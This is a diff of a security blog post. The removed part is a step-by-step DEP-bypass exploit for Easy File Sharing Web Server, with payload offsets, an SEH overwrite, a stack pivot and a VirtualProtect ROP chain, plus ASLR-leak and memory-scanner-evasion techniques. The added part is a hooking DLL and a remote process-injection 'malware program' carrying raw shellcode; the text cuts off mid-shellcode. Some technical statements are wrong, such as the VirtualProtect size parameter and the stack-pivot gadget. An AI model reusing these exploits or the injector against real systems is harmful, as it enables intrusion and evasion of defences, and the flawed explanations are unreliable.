-<p class="wp-block-paragraph">To bypass DEP (Data Execution Prevention) using Return-Oriented Programming (ROP), here&#8217;s a detailed step-by-step breakdown, focusing on a Windows 7 SP1 x64 environment and using the Easy File Sharing Web Server vulnerability.</p>
-
-
-
-<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
-https://github.com/Gu4rana/Using_ROP_Bypassing_DEP
-</div></figure>
-
-
-
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="878" height="723" src="/wp-content/uploads/2024/09/image-13.png" alt="" class="wp-image-8832" srcset="/wp-content/uploads/2024/09/image-13.png 878w, /wp-content/uploads/2024/09/image-13-300x247.png 300w, /wp-content/uploads/2024/09/image-13-768x632.png 768w" sizes="(max-width: 878px) 100vw, 878px" /></figure>
-
-
-
-<h4 class="wp-block-heading">1. <strong>Setup Environment</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Operating System:</strong> Windows 7 SP1 x64</li>
-
-
-
-<li><strong>Vulnerable Application:</strong> Easy File Sharing Web Server (<a href="https://www.exploit-db.com/exploits/38526">exploit link</a>)</li>
-
-
-
-<li><strong>Debugger:</strong> Immunity Debugger with the Mona plugin installed.</li>
-
-
-
-<li><strong>DEP Settings:</strong> Enabled using <code>bcdedit /set nx AlwaysOn</code>.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph"><strong>DEP</strong> prevents execution of code from non-executable memory areas like the stack. To bypass this, ROP chains are used, which consist of short sequences of instructions called <em>gadgets</em>, ending with a <code>RET</code> instruction.</p>
-
-
-
-<h4 class="wp-block-heading">2. <strong>Replicating the Exploit</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li>From exploit-db, we know the application crashes when passing around 5000 bytes to the <code>UserID</code> cookie in the HTTP header.</li>
-
-
-
-<li>Create a test payload:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>exploit = "A" * 5000</code></pre>
-
-
-
-<p class="wp-block-paragraph">This crashes the application and overwrites the <code>EAX</code> register with <code>AAAA</code>. The crash occurs due to the instruction below:</p>
-
-
-
-<pre class="wp-block-code"><code>61C277F6   8178 4C 97A629A0 CMP DWORD PTR DS:&#91;EAX+4C],A029A697</code></pre>
-
-
-
-<ul class="wp-block-list">
-<li>Additionally, the SEH (Structured Exception Handler) chain is overwritten.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">3. <strong>Finding Offset for EAX and SEH Overwrite</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li>Use Mona to generate a unique pattern:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>!mona pc 5000</code></pre>
-
-
-
-<p class="wp-block-paragraph">After the crash, use Mona to find the offsets:</p>
-
-
-
-<pre class="wp-block-code"><code>!mona findmsp</code></pre>
-
-
-
-<p class="wp-block-paragraph">From the logs, you find that <code>EAX</code> is overwritten at offset 4183 and SEH at 4059 bytes.</p>
-
-
-
-<ul class="wp-block-list">
-<li>Modify the exploit payload accordingly:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>exploit = "A" * 4059
-exploit += "B" * 4  # nSEH
-exploit += "C" * 4  # SEH
-exploit += "D" * (4183 - len(exploit))
-exploit += "A" * 4  # Overwrite EAX
-exploit += "D" * (5000 - len(exploit))</code></pre>
-
-
-
-<h4 class="wp-block-heading">4. <strong>Bad Characters</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li>To ensure our exploit is clean, generate and compare the byte array to find bad characters:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>!mona bytearray -cpb '\x00'
-!mona compare -f c:\logs\fsws\bytearray.bin -a 0x057A6F34</code></pre>
-
-
-
-<ul class="wp-block-list">
-<li>Exclude <code>\x00</code> and <code>\x3b</code> from the payload.</li>
-</ul>
-
-
-
-<h3 class="wp-block-heading">5. <strong>ROP Chain Construction</strong></h3>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Stack Pivoting:</strong> The stack pointer points far away from our payload. We need to move it closer. Mona helps us find a stack pivot gadget:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>!mona stackpivot -distance 2548 -cpb '\x00\x3b'</code></pre>
-
-
-
-<p class="wp-block-paragraph">One suitable gadget:</p>
-
-
-
-<pre class="wp-block-code"><code>0x1002280a : {pivot 4100 / 0x1004} # ADD ESP,1004 # RETN ** &#91;ImageLoad.dll]</code></pre>
-
-
-
-<p class="wp-block-paragraph">Update the payload:</p>
-
-
-
-<pre class="wp-block-code"><code>exploit = "A" * 4059
-exploit += "B" * 4  # nSEH
-exploit += struct.pack("&lt;I", 0x1002280a)  # SEH handler with stack pivot
-exploit += "D" * (4183 - len(exploit))
-exploit += "A" * 4  # Overwrite EAX
-exploit += "D" * (5000 - len(exploit))</code></pre>
-
-
-
-<p class="wp-block-paragraph"><strong>ROP Chain Construction:</strong> The goal is to call <code>VirtualProtect()</code> to make our shellcode executable. The steps include:</p>
-
-
-
-<ul class="wp-block-list">
-<li>Stack pivoting.</li>
-
-
-
-<li>Loading correct values into registers using gadgets.</li>
-
-
-
-<li>Calling <code>VirtualProtect()</code> with appropriate parameters.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph">Example gadgets and ROP chain:</p>
-
-
-
-<pre class="wp-block-code"><code>def create_rop_chain():
-    rop_chain = &#91;
-        0x10015442,  # POP EAX # RETN &#91;ImageLoad.dll]
-        0xfffffdff,  # 2's complement of 0x00000201
-        0x100231d1,  # NEG EAX # RETN &#91;ImageLoad.dll]
-        0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:&#91;ESP+C] # RETN &#91;ImageLoad.dll]
-        0x10015442,  # POP EAX # RETN &#91;ImageLoad.dll]
-        0x61c832d0,  # ptr to &amp;VirtualProtect() &#91;sqlite3.dll]
-        0x1001281a,  # ADD ESP,4 # RETN &#91;ImageLoad.dll]
-        0x61c735b4,  # Writable location &#91;sqlite3.dll]
-        # Add more gadgets as needed for ROP
-    ]
-    return ''.join(struct.pack("&lt;I", _) for _ in rop_chain)</code></pre>
-
-
-
-<h4 class="wp-block-heading">6. <strong>VirtualProtect API Call</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Parameters:</strong>
-<ul class="wp-block-list">
-<li><code>lpAddress</code>: Pointer to the memory region you want to change.</li>
-
-
-
-<li><code>dwSize</code>: Size of the region to change (e.g., 0x40 for PAGE_EXECUTE_READWRITE).</li>
-
-
-
-<li><code>flNewProtect</code>: The new protection attribute (e.g., PAGE_EXECUTE_READWRITE).</li>
-
-
-
-<li><code>lpflOldProtect</code>: Pointer to receive the old protection value.</li>
-</ul>
-</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">7. <strong>Final Payload</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li>Ensure enough NOPs (<code>\x90</code>) before the shellcode to avoid overwriting caused by <code>FSTENV</code> pushing data onto the stack.</li>
-
-
-
-<li>Example payload:</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>exploit = "A" * 2455  # Stack pivoting offset
-exploit += create_rop_chain()
-exploit += "\x90" * 32  # NOP slide
-exploit += shellcode  # Your shellcode
-exploit += "D" * (4059 - len(exploit))
-exploit += "BBBB"  # nSEH
-exploit += struct.pack("&lt;I", 0x1002280a)  # SEH handler
-exploit += "D" * (4183 - len(exploit))
-exploit += struct.pack("&lt;I", 0xffffffff)  # Trigger exception
-exploit += "D" * (5000 - len(exploit))</code></pre>
-
-
-
-<h4 class="wp-block-heading"><strong><em>Address Space Layout Randomization (ASLR):</em></strong></h4>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Explanation of ASLR and Its Role in Security:</em></strong> Address Space Layout Randomization (ASLR) is a technique used to randomly arrange the address space of a process, including the base address of executables and shared libraries. This randomization makes it difficult for attackers to predict the location of specific code or data segments, significantly reducing the likelihood of successful exploitation of memory corruption vulnerabilities that rely on fixed addresses.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Methods ROPGadget Uses to Overcome ASLR:</em></strong></p>
-
-
-
-<ol class="wp-block-list">
-<li><strong><em>Information Leakage:</em></strong> Attackers can exploit vulnerabilities that leak information about memory layout to determine the locations of ROP gadgets. By analyzing leaks, attackers can adjust their ROP chains to account for the randomized addresses, effectively overcoming ASLR.</li>
-
-
-
-<li><strong><em>Brute Forcing:</em></strong> In the absence of information leaks, brute-forcing techniques can be used to guess randomized addresses. This involves systematically attempting different address values until the correct ones are found, though this method is often more time-consuming and less practical compared to information leakage.</li>
-</ol>
-
-
-
-<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
-https://redteamrecipe.com/aslr-exploitation-techniques
-</div></figure>
-
-
-
-<p class="wp-block-paragraph">Below is a structured overview of ASLR leak techniques and their relationship to ROP.</p>
-
-
-
-<h4 class="wp-block-heading">1. <strong>Modify Kernel Parameter (Linux)</strong></h4>
-
-
-
-<p class="wp-block-paragraph">ASLR can be modified or disabled at the kernel level, which provides insights into memory layout:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Setarch</strong>: A Linux utility that can run a program in a modified environment, allowing users to change ASLR settings for a specific execution.</li>
-
-
-
-<li><strong>Change Mach-O Flags</strong>: A Python script can be created to change Mach-O flags on macOS binaries to disable ASLR.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">2. <strong>Compiler Options (Windows)</strong></h4>
-
-
-
-<p class="wp-block-paragraph">In Windows, ASLR can be influenced by compiler settings, which can lead to information leaks:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Disabling ASLR in Visual Studio</strong>: Compiling an application with specific flags can disable ASLR, making it easier to predict memory layout.</li>
-
-
-
-<li><strong>SetDllCharacteristics</strong>: This function allows setting the characteristics of a DLL, which can include disabling ASLR.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">3. <strong>Leaking KASLR (Kernel ASLR)</strong></h4>
-
-
-
-<p class="wp-block-paragraph">Kernel ASLR is a feature in many operating systems that randomizes the base address of kernel modules:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Startup_xen</strong>: An information leak during the startup process of a virtual machine in Xen can expose kernel addresses, providing a foothold for further exploitation.</li>
-
-
-
-<li><strong>Android BINDER_TYPE_BINDER</strong>: An address leak can occur via the Android Binder IPC mechanism, allowing attackers to exploit ASLR.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">4. <strong>Buffer Overflow to Control EAX</strong></h4>
-
-
-
-<p class="wp-block-paragraph">Buffer overflows are a common method to manipulate registers and control execution flow:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>RET2ASLR</strong>: This technique involves leveraging a return address that points to a predictable location after ASLR is bypassed.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">5. <strong>Remote ASLR Leak in Microsoft&#8217;s RDP Client (CVE-2021-38665)</strong></h4>
-
-
-
-<p class="wp-block-paragraph">A specific vulnerability in the Microsoft Remote Desktop Protocol (RDP) client allowed attackers to leak memory addresses, circumventing ASLR protections. This enabled the formulation of ROP chains against affected systems.</p>
-
-
-
-<h4 class="wp-block-heading">6. <strong>ROP Techniques</strong></h4>
-
-
-
-<p class="wp-block-paragraph">Once ASLR information is leaked, it can be used in various ROP techniques:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>ASLR Information Leak via Safe-Linking</strong>: In scenarios where a memory allocator is used (like tcache or fastbin chunks), information leaks can occur that reveal the base address of heap objects.</li>
-
-
-
-<li><strong>Return To PLT (Procedure Linkage Table)</strong>: This method allows attackers to jump to the PLT to execute functions indirectly. By controlling the PLT entries, attackers can bypass ASLR.</li>
-</ul>
-
-
-
-<h3 class="wp-block-heading">Advanced Techniques in ROP</h3>
-
-
-
-<h4 class="wp-block-heading"><strong><em>Complex ROP Chains:</em></strong></h4>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Building Intricate Sequences of Gadgets:</em></strong> In Return-Oriented Programming (ROP), complex ROP chains are constructed by chaining together multiple gadgets to perform advanced operations. These gadgets are small code sequences ending in a <code>ret</code> instruction, allowing for precise control over execution flow.</p>
-
-
-
-<p class="wp-block-paragraph">For example, consider the following simple ROP chain:</p>
-
-
-
-<ol class="wp-block-list">
-<li><strong>**Stack Pivoting Gadget:</strong></li>
-</ol>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>pop rdi ret</code></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget sets the <code>rdi</code> register to a new value by popping from the stack, often used to pivot the stack pointer.</p>
-
-
-
-<ol start="2" class="wp-block-list">
-<li><strong><em>Arithmetic Gadget:</em></strong></li>
-</ol>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>add eax, 0x10 ret</code></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget increments the <code>eax</code> register by <code>0x10</code>.</p>
-
-
-
-<ol start="3" class="wp-block-list">
-<li><strong><em>Memory Access Gadget:</em></strong></li>
-</ol>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>mov [rbx], rax ret</code></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget stores the value of <code>rax</code> into the memory address pointed to by <code>rbx</code>.</p>
-
-
-
-<ol start="4" class="wp-block-list">
-<li><strong><em>Function Call Gadget:</em></strong></li>
-</ol>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>call [rcx] ret</code></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget performs a function call with the address stored in <code>rcx</code>.</p>
-
-
-
-<p class="wp-block-paragraph">Combining these gadgets in a ROP chain allows an attacker to manipulate stack pointers, perform arithmetic operations, and execute function calls. For example, an attacker might pivot the stack to a controlled location, modify values in memory, and call a function with specific parameters.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Examples of Combining Various Gadget Types:</em></strong> A ROP chain might look like this :</p>
-
-
-
-<pre class="wp-block-code"><code>#0x5050118e: mov eax, esi ; pop esi ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
-
-#0x5052db24: pop ecx ; ret&amp;nbsp; ;
-
-#0x50533bf4: sub eax, ecx ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
-
-#0x505263f9: push eax ; pop esi ; pop ebx ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
-
-#0x5053a0f5: pop eax ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
-
-#0x5050626e: add byte &#91;esi+0x3B], ah ; ret&amp;nbsp; ;</code></pre>
-
-
-
-<h4 class="wp-block-heading">DeepSleep</h4>
-
-
-
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="887" height="270" src="/wp-content/uploads/2024/09/image-14.png" alt="" class="wp-image-8833" srcset="/wp-content/uploads/2024/09/image-14.png 887w, /wp-content/uploads/2024/09/image-14-300x91.png 300w, /wp-content/uploads/2024/09/image-14-768x234.png 768w" sizes="(max-width: 887px) 100vw, 887px" /></figure>
-
-
-
-<p class="wp-block-paragraph">DeepSleep is a technique inspired by Gargoyle for x64 environments that utilizes Return-Oriented Programming (ROP) and Position Independent Code (PIC) to hide memory artifacts. The primary goal is to set up a ROP chain that calls <code>VirtualProtect()</code> to modify memory permissions, sleeps, and then resets the memory protection while avoiding detection by memory scanners like Moneta.</p>
-
-
-
-<ol class="wp-block-list">
-<li><strong>ROP Chain</strong>: A sequence of carefully crafted gadget calls that allows an attacker to execute arbitrary code while evading detection.</li>
-
-
-
-<li><strong>PIC (Position Independent Code)</strong>: Code that executes properly regardless of its memory address. This is crucial for making the payload stealthy and effective across different environments.</li>
-
-
-
-<li><strong>Memory Protection</strong>: The technique involves altering memory protection states to execute the malicious code while minimizing detection risk.</li>
-</ol>
-
-
-
-<h4 class="wp-block-heading">Implementation</h4>
-
-
-
-<p class="wp-block-paragraph"><strong>Prerequisites</strong></p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Development Environment</strong>: MinGW or a compatible environment to compile the code.</li>
-
-
-
-<li><strong>Windows Version</strong>: Tested on Windows 10, version 10.0.19044.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">ROP Chain Construction</h4>
-
-
-
-<p class="wp-block-paragraph">The following steps outline how to construct the ROP chain using VirtualProtect, Sleep, and back to VirtualProtect:</p>
-
-
-
-<ol class="wp-block-list">
-<li><strong>ROP Gadgets</strong>: Identify the necessary ROP gadgets from <code>ntdll.dll</code>. The gadgets should include:
-<ul class="wp-block-list">
-<li>A gadget to call <code>VirtualProtect()</code>.</li>
-
-
-
-<li>A gadget to call <code>Sleep()</code>.</li>
-
-
-
-<li>A final gadget to call <code>VirtualProtect()</code> again to revert the memory protection.</li>
-</ul>
-</li>
-
-
-
-<li><strong>Gadget Example</strong>: Here’s how you might find and construct your ROP gadgets.</li>
-</ol>
-
-
-
-<pre class="wp-block-code"><code>!mona rop -m ntdll.dll -cpb '\x00'</code></pre>
-
-
-
-<p class="wp-block-paragraph">This command will help you find the available ROP gadgets in <code>ntdll.dll</code> while excluding null bytes.</p>
-
-
-
-<h4 class="wp-block-heading">Sample Code for DeepSleep</h4>
-
-
-
-<p class="wp-block-paragraph">Here&#8217;s a simple example of how to set up the ROP chain for DeepSleep.</p>
+<p class="wp-block-paragraph">This will be our mini EDR code that will be used to place hooked on NtAllocateVirtualMemory . we will generate DLL file form this</p>
 
 
 
 <pre class="wp-block-code"><code>#include &lt;windows.h&gt;
-#include &lt;stdio.h&gt;
 
-// Function prototype for VirtualProtect
-BOOL VirtualProtect(
-    LPVOID lpAddress,
-    SIZE_T dwSize,
-    DWORD flNewProtect,
-    PDWORD lpflOldProtect
+#include &lt;iostream&gt;
+
+#include "detours.h"
+
+#pragma warning(disable : 4530)
+
+// TO COMPILE:
+
+//cl.exe /nologo /W0 edr.cpp /MT /link /DLL detours\lib.X64\detours.lib /OUT:edr.dll
+
+using pNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(
+
+IN HANDLE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ProcessHandle,
+
+IN OUT PVOID* BaseAddress,
+
+IN ULONG_PTR&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ZeroBits,
+
+IN OUT PSIZE_T&nbsp; &nbsp; &nbsp; &nbsp; RegionSize,
+
+IN ULONG&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; AllocationType,
+
+IN ULONG&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Protect
+
 );
 
-void main() {
-    // Step 1: Prepare the ROP chain
-    // Assuming we have found the following gadgets:
-    // - gadget1: address of VirtualProtect
-    // - gadget2: address of Sleep
-    // - gadget3: address of VirtualProtect again
+pNtAllocateVirtualMemory myNtAllocateVirtualMemory = NULL;
 
-    // Example addresses for ROP gadgets (replace with actual addresses)
-    ULONG_PTR gadget1 = 0x00000000; // Replace with the actual address for VirtualProtect
-    ULONG_PTR gadget2 = 0x00000000; // Replace with the actual address for Sleep
-    ULONG_PTR gadget3 = 0x00000000; // Replace with the actual address for VirtualProtect
+NTSTATUS NTAPI HookedNtAllocateVirtualMemory(
 
-    // Step 2: Build the ROP chain
-    // Create a buffer to hold the ROP chain
-    ULONG_PTR ropChain&#91;6];
+IN HANDLE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ProcessHandle,
 
-    // Push necessary values onto the stack for VirtualProtect
-    ropChain&#91;0] = gadget1; // Address of VirtualProtect
-    ropChain&#91;1] = 0x400;   // Size of the page to modify
-    ropChain&#91;2] = PAGE_EXECUTE_READWRITE; // New protection
-    ropChain&#91;3] = NULL; // Old protection placeholder
+IN OUT PVOID* BaseAddress,
 
-    // Call Sleep to suspend execution
-    ropChain&#91;4] = gadget2; // Address of Sleep
-    ropChain&#91;5] = 1000; // Sleep for 1000 ms
+IN ULONG_PTR&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ZeroBits,
 
-    // Step 3: Execute the ROP chain
-    // This is where you would normally trigger the ROP chain execution.
+IN OUT PSIZE_T&nbsp; &nbsp; &nbsp; &nbsp; RegionSize,
 
-    // For demonstration, we will just call the functions directly
-    VirtualProtect((LPVOID)ropChain&#91;0], ropChain&#91;1], ropChain&#91;2], (PDWORD)ropChain&#91;3]);
-    Sleep(ropChain&#91;5]);
-    VirtualProtect((LPVOID)ropChain&#91;0], ropChain&#91;1], PAGE_READWRITE, (PDWORD)ropChain&#91;3]);
+IN ULONG&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; AllocationType,
 
-    printf("Executed DeepSleep ROP Chain!\n");
+IN ULONG&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Protect
+
+){
+
+NTSTATUS status = myNtAllocateVirtualMemory(ProcessHandle, BaseAddress,ZeroBits,RegionSize,AllocationType,Protect);
+
+if(!ProcessHandle) return status;
+
+std::cout &lt;&lt; "&#91;EDR] detected NtAllocateVirtualMemory usage on PID " &lt;&lt; GetProcessId(ProcessHandle) &lt;&lt; std::endl;
+
+return status;
+
+}
+
+BOOL Hook(void) {
+
+LONG err;
+
+myNtAllocateVirtualMemory &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; =
+
+(pNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
+
+"NtAllocateVirtualMemory");
+
+DetourRestoreAfterWith();
+
+DetourTransactionBegin(); DetourUpdateThread(GetCurrentThread()); DetourAttach(&amp;(PVOID&amp;)myNtAllocateVirtualMemory,
+
+HookedNtAllocateVirtualMemory);
+
+err = DetourTransactionCommit();
+
+return TRUE;
+
+}
+
+BOOL UnHook(void) {
+
+LONG err;
+
+DetourTransactionBegin(); DetourUpdateThread(GetCurrentThread()); DetourDetach(&amp;(PVOID&amp;)myNtAllocateVirtualMemory,
+
+HookedNtAllocateVirtualMemory);
+
+err = DetourTransactionCommit();
+
+return TRUE;
+
+}
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+
+DWORD&nbsp; ul_reason_for_call,
+
+LPVOID lpReserved
+
+)
+
+{
+
+if (DetourIsHelperProcess()) {
+
+return TRUE;
+
+}
+
+switch (ul_reason_for_call)
+
+{
+
+case DLL_PROCESS_ATTACH:
+
+Hook();
+
+std::cout &lt;&lt; "&#91;EDR] Hook installed." &lt;&lt; std::endl; break;
+
+case DLL_THREAD_ATTACH:
+
+break;
+
+case DLL_THREAD_DETACH:
+
+break;
+
+case DLL_PROCESS_DETACH:
+
+UnHook();
+
+std::cout &lt;&lt; "&#91;EDR] Hook uninstalled." &lt;&lt; std::endl; break;
+
+}
+
+return TRUE;
+
 }</code></pre>
 
 
 
-<p class="wp-block-paragraph">While DeepSleep aims to evade detection, certain behaviors may still be flagged by security tools. For instance, calling <code>VirtualProtect()</code> repeatedly may leave traces in the call stack that security tools can identify. It&#8217;s crucial to continuously assess and adapt the technique to stay ahead of detection mechanisms.</p>
+<p class="wp-block-paragraph">we can compile it using :</p>
 
 
 
-<h3 class="wp-block-heading">ROPDecoder</h3>
+<p class="wp-block-paragraph">cl.exe /nologo /W0 edr.cpp /MT /link /DLL detours\lib.X64\detours.lib /OUT:edr.dll</p>
 
 
 
-<p class="wp-block-paragraph">The <strong>ROPDecoder</strong> is essential in bypassing restrictions like <strong>Data Execution Prevention (DEP)</strong> when executing shellcode. It facilitates the modification of &#8220;bad characters&#8221; that can crash the exploit when executed. These bad characters typically include control characters and null bytes that disrupt the execution flow.</p>
+<p class="wp-block-paragraph">Now we have to create a malware program that will inject our shell code to <strong>remote process</strong> , but that malware program should also take this edr.dll file , which in real<strong> </strong>would be implemented by EDR solutions for hooking , here we will do it manually. for this malware we will use <strong>dynamic loading of native api</strong> ,means we will be using ntdll.dll functions by resolving its addresses on runtime and concept of <strong>remote process injection</strong> for injecting the shellcode in remote process&#8217;s memory.</p>
 
 
 
-<p class="wp-block-paragraph">by https://zeyadazima.com/exploit%20development/ropdecoder/</p>
+<p class="wp-block-paragraph"><strong>Using Ntdll functions directly from ntdll.dll file by resolving addresses on Runtime for Remote Process Injection</strong></p>
 
 
 
-<h4 class="wp-block-heading">Why Do We Need ROPDecoder?</h4>
+<pre class="wp-block-code"><code>#include &lt;Windows.h&gt;
+
+#include &lt;iostream&gt;
+
+#include &lt;winternl.h&gt;
+
+using pNtOpenProcess = NTSTATUS(NTAPI*)(
+
+IN PHANDLE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ProcessHandle,
+
+IN ACCESS_MASK&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DesiredAccess,
+
+IN OPTIONAL CLIENT_ID*ClientId&nbsp;);&nbsp;&nbsp;&nbsp;using pNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(IN HANDLEProcessHandle,// Process handle in where toallocate memory&nbsp;&nbsp;&nbsp;IN OUT PVOID* BaseAddress,// The returned allocated memory's baseaddress&nbsp;&nbsp;&nbsp;IN ULONG_PTRZeroBits,&nbsp;// Always set to '0'IN OUT PSIZE_TRegionSize,// Size of memory to allocateIN ULONGAllocationType,// MEM_COMMIT | MEM_RESERVEIN ULONGProtect&nbsp;// Page protection);&nbsp;&nbsp;&nbsp;using pNtWriteVirtualMemory = NTSTATUS(NTAPI*)(IN HANDLEProcessHandle,&nbsp;IN PVOIDBaseAddress,&nbsp;IN PVOIDBuffer,&nbsp;IN SIZE_TNumberOfBytesToWrite,OUT PSIZE_TNumberOfBytesWritten);&nbsp;&nbsp;&nbsp;
+
+using pNtProtectVirtualMemory = NTSTATUS (NTAPI*)(
+
+IN HANDLE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ProcessHandle, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Process handle whose
+
+memory protection is to be changed
+
+IN OUT PVOID* BaseAddress, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Pointer to the base address to
+
+protect
+
+IN OUT PSIZE_T&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NumberOfBytesToProtect, &nbsp; &nbsp; &nbsp; // Pointer to size of
+
+region to protect
+
+IN ULONG &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NewAccessProtection, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // New memory
+
+protection to be set
+
+OUT PULONG&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; OldAccessProtection &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Pointer to a
+
+variable that receives the previous access protection );
+
+using pNtCreateThreadEx = NTSTATUS(NTAPI*)( OUT PHANDLE hThread,
+
+IN ACCESS_MASK DesiredAccess,
+
+IN PVOID ObjectAttributes,
+
+IN HANDLE ProcessHandle,
+
+IN PVOID lpStartAddress,
+
+IN PVOID lpParameter,
+
+IN ULONG Flags,
+
+IN SIZE_T StackZeroBits,
+
+IN SIZE_T SizeOfStackCommit,
+
+IN SIZE_T SizeOfStackReserve,
+
+OUT PVOID lpBytesBuffer
+
+);
+
+int main(int argc, char** argv)
+
+{
+
+std::cout &lt;&lt; "inject edr.dll to PID '" &lt;&lt; GetProcessId(GetCurrentProcess())
+
+&lt;&lt; "' and then press any key to continue!" &lt;&lt; std::endl; getchar();
+
+//&nbsp; shellcode to spawn a cmd.exe prompt
+
+unsigned char buf&#91;] =
+
+"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+
+"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+
+"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+
+"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+
+"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+
+"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+
+"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+
+"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+
+"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+
+"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+
+"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+
+"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+
+"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+
+"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+
+"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+
+"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
+
